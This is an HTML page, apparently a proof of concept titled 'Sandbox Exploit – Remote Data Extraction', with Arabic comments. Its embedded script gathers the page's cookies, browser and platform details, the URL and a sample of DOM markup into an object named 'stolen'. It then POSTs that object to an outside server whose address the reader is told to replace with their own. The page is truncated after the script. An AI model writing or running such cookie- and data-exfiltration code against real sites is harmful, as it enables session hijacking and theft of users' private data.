<html lang="en">

<body>
  <h2>🔥 Sandbox Exploit – Remote Data Extraction</h2>

  <script>
    console.log("🚀 PoC started – collecting data...");

    // 1. اجمع البيانات
    const stolen = {
      cookies: document.cookie || "",
      localStorage: {},
      sessionStorage: {},
      info: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        url: location.href,
        time: new Date().toISOString()
      },
      domSample: Array.from(document.querySelectorAll("*"))
                     .slice(0, 5)
                     .map(el => el.outerHTML)
    };

    // 2. عرض محلي (للتأكيد)
    console.log("📦 Data collected:");

    // 3. إرسال للخارج (Webhook أو سيرفرك)
    const exfilUrl = "http://192.168.100.103:8080"; // ← غيره برابطك
    fetch(exfilUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(stolen)
    })
    .then(r => console.log("🌐 Remote exfil success →", r.status))
    .catch(e => console.error("⚠️ Exfil blocked:", e));
